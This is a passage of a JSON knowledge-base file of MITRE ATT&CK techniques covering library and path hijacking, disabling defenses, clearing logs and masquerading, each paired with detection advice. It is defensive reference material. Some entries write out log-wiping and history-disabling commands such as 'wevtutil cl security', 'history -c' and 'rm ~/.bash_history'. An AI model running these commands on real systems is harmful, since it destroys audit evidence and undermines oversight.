        "description": " \nAdversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.  \n \n\nAdversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or  /etc/ld.so.preload file.  \n \nLibraries specified by LD_PRELOAD with be loaded and mapped into memory by  dlopen() and  mmap() respectively.  \n  \n  \n\nLD_PRELOAD hijacking may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. Execution via LD_PRELOAD hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor for changes to environment variables and files associated with loading shared libraries such as LD_PRELOAD, as well as the commands to implement these changes.Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\n"
      },
      "T1574.007": {
        "name": "Path Interception by PATH Environment Variable",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line. \nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\\system32 (e.g.,  C:\\Windows\\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line. \nFor example, if  C:\\example path precedes ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.008": {
        "name": "Path Interception by Search Order Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program. \nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike  DLL Search Order Hijacking , the search order differs depending on the method that is used to execute the program.  \n  \n  \nHowever, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory. \nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument  net user . An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then  cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.  \n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in  DLL Search Order Hijacking .  ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.009": {
        "name": "Path Interception by Unquoted Path",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. \nService paths  \nand shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\\unsafe path with space\\program.exe vs.  \"C:\\safe path with space\\program.exe\" ).  \n(stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\\program files\\myapp.exe , an adversary may create a program at  C:\\program.exe that will be run instead of the intended program.  \n  \n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.  ",
        "detection": "\nMonitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1574.010": {
        "name": "Services File Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. \nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.  ",
        "detection": "\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\n"
      },
      "T1574.011": {
        "name": "Services Registry Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under  HKLM\\SYSTEM\\CurrentControlSet\\Services . The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell , or  Reg . Access to Registry keys is controlled through Access Control Lists and permissions.  \n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). \nAdversaries may also alter Registry keys associated with service failure parameters (such as  FailureCommand ) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.  \n \n  ",
        "detection": "\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information.   Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\n"
      },
      "T1574.012": {
        "name": "COR_PROFILER",
        "description": " \nAdversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.  \n \n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a  Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.  \n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:  Bypass User Account Control ) if the victim .NET process executes at a higher permission level, as well as to hook and  Impair Defenses provided by .NET processes.  \n \n \n \n \n ",
        "detection": "\nFor detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and Reg, monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.  Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.\n\n"
      },
      "T1562": {
        "name": "Impair Defenses",
        "description": " \nAdversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators. \nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.  ",
        "detection": "\nMonitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.Monitor environment variables and APIs that can be leveraged to disable security measures.\n\n\n\n\n\n\n\n\n\n\n"
      },
      "T1562.001": {
        "name": "Disable or Modify Tools",
        "description": " \nAdversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.  ",
        "detection": "\nMonitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious.\n\n"
      },
      "T1562.002": {
        "name": "Disable Windows Event Logging",
        "description": " \nAdversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.  \nThis data is used by security tools and analysts to generate detections. \nAdversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.  ",
        "detection": "\nMonitor processes and command-line arguments for commands that can be used to disable logging. Lack of event logs may be suspicious.\n\n"
      },
      "T1562.003": {
        "name": "Impair Command History Logging",
        "description": " \nAdversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable  HISTFILE . When a user logs off a system, this information is flushed to a file in the user's home directory called  ~/.bash_history . The  HISTCONTROL environment variable keeps track of what should be saved by the  history command and eventually into the  ~/.bash_history file when a user logs out.  HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. \nAdversaries may clear the history environment variable (  unset HISTFILE ) or set the command history size to zero (  export HISTFILESIZE=0 ) to prevent logging of commands. Additionally,  HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\".  HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \nOn Windows systems, the  PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file (  $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). Adversaries may change where these logs are saved using  Set-PSReadLineOption -HistorySavePath {{File Path}} . This will cause  ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command  Set-PSReadlineOption -HistorySaveStyle SaveNothing .  \n \n \n ",
        "detection": "\nCorrelating a user session with a distinct lack of new commands in their .bash_history can be a clue to suspicious behavior. Additionally, users checking or changing their HISTCONTROL, HISTFILE, or HISTFILESIZE environment variables may be suspicious.Monitor for modification of PowerShell command history settings through processes being created with -HistorySaveStyle SaveNothing command-line arguments and use of the PowerShell commands Set-PSReadlineOption -HistorySaveStyle SaveNothing and Set-PSReadLineOption -HistorySavePath {{File Path}}. \n\n"
      },
      "T1562.004": {
        "name": "Disable or Modify System Firewall",
        "description": " \nAdversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel. \nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.  ",
        "detection": "\nMonitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.\n\n"
      },
      "T1562.006": {
        "name": "Indicator Blocking",
        "description": " \nAn adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting  \nor even disabling host-based sensors, such as Event Tracing for Windows (ETW),  \nby tampering settings that control the collection and flow of event telemetry.  \nThese settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as  PowerShell or  Windows Management Instrumentation . \nETW interruption can be achieved multiple ways, however most directly by defining conditions using the  PowerShell   Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations. \nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.  ",
        "detection": "\nDetect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session.   To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME{{PROVIDER_GUID}}\n\n"
      },
      "T1562.007": {
        "name": "Disable or Modify Cloud Firewall",
        "description": " \nAdversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in  Disable or Modify System Firewall . \nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.  \n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.  ",
        "detection": "\nMonitor cloud logs for modification or creation of new security groups or firewall rules.\n\n"
      },
      "T1562.008": {
        "name": "Disable Cloud Logs",
        "description": " \nAn adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. \nCloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an attacker has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.  \n ",
        "detection": "\nMonitor logs for API calls to disable logging. In AWS, monitor for: StopLogging and DeleteTrail.  In GCP, monitor for: google.logging.v2.ConfigServiceV2.UpdateSink.   In Azure, monitor for az monitor diagnostic-settings delete.  Additionally, a sudden loss of a log source may indicate that it has been disabled.\n\n"
      },
      "T1070": {
        "name": "Indicator Removal on Host",
        "description": " \nAdversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as  Bash History and /var/log/*. \nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.  ",
        "detection": "\nFile system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.\n\n"
      },
      "T1070.001": {
        "name": "Clear Windows Event Logs",
        "description": " \nAdversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit. \nThe event logs can be cleared with the following utility commands:  wevtutil cl system  wevtutil cl application  wevtutil cl security \nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or  PowerShell .  ",
        "detection": "\nDeleting Windows event logs (via native binaries  , API functions  , or PowerShell  ) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\").\n\n"
      },
      "T1070.002": {
        "name": "Clear Linux or Mac System Logs",
        "description": " \nAdversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the  /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:  \n /var/log/messages: : General and system-related messages  /var/log/secure or  /var/log/auth.log : Authentication logs  /var/log/utmp or  /var/log/wtmp : Login records  /var/log/kern.log : Kernel logs  /var/log/cron.log : Crond logs  /var/log/maillog : Mail server logs  /var/log/httpd/ : Web server access and error logs  ",
        "detection": "\nFile system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.\n\n"
      },
      "T1070.003": {
        "name": "Clear Command History",
        "description": " \nIn addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable  HISTFILE . When a user logs off a system, this information is flushed to a file in the user's home directory called  ~/.bash_history . The benefit of this is that it allows users to go back to commands they've used before in different sessions. \nAdversaries may delete their commands from these logs by manually clearing the history (  history -c ) or deleting the bash history file  rm ~/.bash_history . \nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the  PSReadLine module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends. \nThe  PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file (  $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.  \n\nAdversaries may run the PowerShell command  Clear-History to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the  ConsoleHost_history.txt file. Adversaries may also delete the  ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.  \n \n ",
        "detection": "\nUser authentication, especially via remote terminal services like SSH, without new entries in that user's ~/.bash_history is suspicious. Additionally, the removal/clearing of the ~/.bash_history file can be an indicator of suspicious activity.Monitor for suspicious modifications or deletion of ConsoleHost_history.txt and use of the Clear-History command.\n\n"
      },
      "T1070.004": {
        "name": "File Deletion",
        "description": " \nAdversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. \nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native  cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.  \n ",
        "detection": "\nIt may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.\n\n"
      },
      "T1070.005": {
        "name": "Network Share Connection Removal",
        "description": " \nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and  Windows Admin Shares connections can be removed when no longer needed.  Net is an example utility that can be used to remove network share connections with the  net use \\system\\share /delete command.  \n ",
        "detection": "\nNetwork share connections may be common depending on how an network environment is used. Monitor command-line invocation of net use commands associated with establishing and removing remote shares over SMB, including following best practices for detection of Windows Admin Shares. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.\n\n"
      },
      "T1070.006": {
        "name": "Timestomp",
        "description": " \nAdversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. \nTimestomping may be used along with file name  Masquerading to hide malware and tools.  \n ",
        "detection": "\nForensic techniques exist to detect aspects of files that have had their timestamps modified.   It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.\n\n"
      },
      "T1202": {
        "name": "Indirect Command Execution",
        "description": " \nAdversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking  cmd . For example,  Forfiles , the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a  Command and Scripting Interpreter , Run window, or via scripts.  \n  \n\nAdversaries may abuse these features for  Defense Evasion , specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of  cmd or file extensions more commonly associated with malicious payloads.  ",
        "detection": "\nMonitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections.  \n\n"
      },
      "T1036": {
        "name": "Masquerading",
        "description": " \nAdversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names. \nRenaming abusable system utilities to evade security monitoring is also a form of  Masquerading .  \n ",
        "detection": "\nCollect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity.   Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection. Look for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE\".\n\n"
      },
      "T1036.001": {
        "name": "Invalid Code Signature",
        "description": " \nAdversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.  \n\nUnlike  Code Signing , this activity will not result in a valid signature.  ",
        "detection": "\nCollect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.\n\n"
      },
      "T1036.002": {
        "name": "Right-to-Left Override",
        "description": " \nAdversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.  \nFor example, a Windows screensaver executable named  March 25 \\u202Excod.scr will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\\u202Egnp.js will be displayed as  photo_high_resj.png . \nA common use of this technique is with  Spearphishing Attachment /  Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.  \n \nRTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.  ",
        "detection": "\nDetection methods should include looking for common formats of RTLO characters within filenames such as \\u202E, [U+202E], and %E2%80%AE. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.\n\n"
      },
      "T1036.003": {
        "name": "Rename System Utilities",
        "description": " \nAdversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  \nIt may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename  rundll32.exe ).  \nAn alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.  \n ",
        "detection": "\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity.   Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection. \n\n"
      },
      "T1036.004": {
        "name": "Masquerade Task or Service",
        "description": " \nAdversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.  \n \nWindows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones. \nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.  \n \n ",
        "detection": "\nLook for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1036.005": {
        "name": "Match Legitimate Name or Location",
        "description": " \nAdversaries may match or approximate the name or location of legitimate files when naming/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. \nAdversaries may also use the same icon of the file they are trying to mimic.  ",
        "detection": "\nCollect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity.   Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection. \n\n"
      },
      "T1036.006": {
        "name": "Space after Filename",
        "description": " \nAdversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. \nFor example, if there is a Mach-O executable file called  evil.bin , when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to  evil.txt , then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to  evil.txt (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed  \n. \nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.  ",
        "detection": "\nIt's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.\n\n"
      },
      "T1556": {
        "name": "Modify Authentication Process",
        "description": " \nAdversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. \nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.  ",
